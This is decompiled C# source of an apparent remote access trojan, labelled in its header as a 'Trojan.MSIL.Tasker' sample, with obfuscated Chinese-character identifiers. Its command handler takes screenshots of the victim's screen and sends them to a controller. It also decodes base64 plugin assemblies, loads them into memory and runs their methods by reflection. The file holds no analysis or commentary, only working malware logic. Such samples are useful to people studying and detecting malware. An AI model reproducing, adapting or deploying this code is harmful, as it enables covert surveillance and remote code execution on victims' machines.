// Decompiled with JetBrains decompiler
// Type: 成為的合接城接人管.首成將人的法受合的望的
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using 成官執望是導;
using 的法公管的澤尊;
using 繼承澤顧澤的官生顧城將人;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 成為的合接城接人管
{
  public class 首成將人的法受合的望的
  {
    private static object 顧人程的孫尊法公合是 = (object) 管導行官玉.她尊玉司合命希的顧法人;

    public static void 受商的顧太使使(byte[] 成望的她的人商命引為顧管)
    {
      try
      {
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "OK", 首成將人的法受合的望的.顧人程的孫尊法公合是), (object) 的公的人官導官太命程.將太將金法司子的()), 首成將人的法受合的望的.顧人程的孫尊法公合是), 的公的人官導官太命程.首導顧引為玉孫成太接家成繼金())));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string[] strArray = Strings.Split(Conversions.ToString(她顧使金太.人商顧的將(命澤成的敬太.澤成將希商使金成是承的承成(成望的她的人商命引為顧管))), Conversions.ToString(首成將人的法受合的望的.顧人程的孫尊法公合是));
      try
      {
        string Left = strArray[0];
        if (Operators.CompareString(Left, "!PSend", false) != 0)
        {
          if (Operators.CompareString(Left, "!P", false) != 0)
          {
            if (Operators.CompareString(Left, "!CAP", false) != 0)
            {
              if (Operators.CompareString(Left, "CPL", false) != 0)
              {
                if (Operators.CompareString(Left, "IPL", false) != 0)
                {
                  if (Operators.CompareString(Left, "IPLM", false) != 0)
                    return;
                  byte[] 商子的官是公承顧 = Convert.FromBase64String(strArray[1]);
                  bool flag = false;
                  ref bool local = ref flag;
                  首成將人的法受合的望的.太的法顧命(命澤成的敬太.是望的澤太承太商她孫(商子的官是公承顧, ref local), strArray[2]);
                }
                else
                {
                  命澤成的敬太.程金的希尊顧的行顧席司玉家(strArray[2], strArray[1]);
                  byte[] 商子的官是公承顧 = Convert.FromBase64String(命澤成的敬太.導子金人承導敬人行席望人(strArray[2]));
                  bool flag = false;
                  ref bool local = ref flag;
                  首成將人的法受合的望的.太的法顧命(命澤成的敬太.是望的澤太承太商她孫(商子的官是公承顧, ref local));
                }
              }
              else if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人(strArray[1]), (string) null, false) == 0)
              {
                人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject((object) "GPL", 首成將人的法受合的望的.顧人程的孫尊法公合是), (object) strArray[1])));
              }
              else
              {
                byte[] 商子的官是公承顧 = Convert.FromBase64String(命澤成的敬太.導子金人承導敬人行席望人(strArray[1]));
                bool flag = false;
                ref bool local = ref flag;
                首成將人的法受合的望的.太的法顧命(命澤成的敬太.是望的澤太承太商她孫(商子的官是公承顧, ref local));
              }
            }
            else
            {
              try
              {
                Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format16bppRgb555);
                Graphics graphics1 = Graphics.FromImage((Image) bitmap1);
                Size blockRegionSize = new Size(bitmap1.Width, bitmap1.Height);
                graphics1.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
                MemoryStream memoryStream = new MemoryStream();
                Bitmap bitmap2 = new Bitmap(256, 156);
                Graphics graphics2 = Graphics.FromImage((Image) bitmap2);
                graphics2.DrawImage((Image) bitmap1, new Rectangle(0, 0, 256, 156), new Rectangle(0, 0, bitmap1.Width, bitmap1.Height), GraphicsUnit.Pixel);
                bitmap2.Save((Stream) memoryStream, ImageFormat.Jpeg);
                人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "#CAP", 首成將人的法受合的望的.顧人程的孫尊法公合是), 的公的人官導官太命程.首執法成太將澤城生是首執的的()), 首成將人的法受合的望的.顧人程的孫尊法公合是), (object) Encoding.Default.GetString(memoryStream.ToArray()))));
                try
                {
                  graphics1.Dispose();
                  memoryStream.Dispose();
                  bitmap2.Dispose();
                  graphics2.Dispose();
                  bitmap1.Dispose();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else
            人司的敬是將生執顧.玉城顧為的人導 = true;
        }
        else
        {
          人司的敬是將生執顧.公敬繼澤顧玉顧商家 = true;
          人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("!PStart");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "MSG", 首成將人的法受合的望的.顧人程的孫尊法公合是), (object) "Error! "), (object) exception.Message)));
        ProjectData.ClearProjectError();
      }
    }

    public static void 太的法顧命(byte[] 合公澤敬敬是希司顧, string 金成澤她司澤首敬接顧的太 = null)
    {
      try
      {
        System.Type[] types = AppDomain.CurrentDomain.Load(合公澤敬敬是希司顧).GetTypes();
        int index1 = 0;
        while (index1 < types.Length)
        {
          MethodInfo[] methods = types[index1].GetMethods();
          int index2 = 0;
          while (index2 < methods.Length)
          {
            MethodInfo methodInfo = methods[index2];
            if (Operators.CompareString(methodInfo.Name, "CN", false) == 0)
              methodInfo.Invoke((object) null, new object[9]
              {
                (object) 管導行官玉.太官敬司席金家司為命的,
                (object) 管導行官玉.顧承商澤命尊承孫望管,
                (object) 人司的敬是將生執顧.她顧人執顧的的顧引,
                (object) 人司的敬是將生執顧.承合生子子的家首希管城的是,
                (object) 管導行官玉.首的席顧商城行望她司的金引,
                管導行官玉.是敬澤合為的法管金承接生人,
                (object) 的公的人官導官太命程.將太將金法司子的(),
                的公的人官導官太命程.首執法成太將澤城生是首執的的(),
                她顧使金太.人商顧的將(管導行官玉.她是合顧玉接首管管是)
              });
            else if (Operators.CompareString(methodInfo.Name, "MISC", false) == 0)
              methodInfo.Invoke((object) null, new object[2]
              {
                (object) 的公的人官導官太命程.將太將金法司子的(),
                (object) 金成澤她司澤首敬接顧的太
              });
            else if (Operators.CompareString(methodInfo.Name, "CL", false) == 0)
              methodInfo.Invoke((object) null, new object[6]
              {
                (object) 管導行官玉.公的的顧的首太繼行的程公尊,
                (object) 管導行官玉.望程玉司希,
                管導行官玉.是敬澤合為的法管金承接生人,
                (object) 的公的人官導官太命程.成顧家的的的受澤(),
                (object) 的公的人官導官太命程.將太將金法司子的(),
                (object) 金成澤她司澤首敬接顧的太
              });
            checked { ++index2; }
          }
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "MSG", 首成將人的法受合的望的.顧人程的孫尊法公合是), (object) "Plugin Error! "), (object) exception.Message)));
        ProjectData.ClearProjectError();
      }
    }
  }
}
